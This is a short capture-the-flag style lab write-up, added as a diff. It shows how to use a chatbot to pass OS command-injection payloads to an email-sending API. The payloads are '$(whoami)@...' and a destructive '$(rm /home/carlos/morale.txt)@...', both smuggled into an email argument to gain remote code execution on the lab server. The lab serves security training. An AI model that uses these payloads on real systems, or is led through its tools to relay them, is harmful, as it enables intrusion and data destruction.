@@ -1,0 +1,30 @@
+Lab02: Exploiting vulnerabilities in LLM APIs
+
+PRACTITIONER
+
+Obj: Run an os injection through a chatbot
+
+
+PRINCIPLE
+APIs that send emails sometimes use operating system commands that offer a pathway to RCE.
+
+
+METHOD
+Enumerate the chatbot and learn what arguments each API takes as learned in lab01
+
+Now, ask the chatbot to pass "attacker@exploit-LabId.exploit-server.net" as arguments to subscribe_to_newsletter API
+
+Notice in the email client interface how the mail is returned?
+
+Try using "$(whoami)@exploit-LabId.exploit-server.net" as argument to subscribe_to_newsletter
+
+It should return "carlos" in the email client interface under "To"
+
+To exploit this and obtain RCE, we use "$(rm /home/carlos/morale.txt)@exploit-LabId.exploit-server.net"
+
+NB
+It may say "invalid email" or such errors, but the exploit worked
+
+
+
+Watch "https://youtu.be/FISz_pjhIOg" for other methods
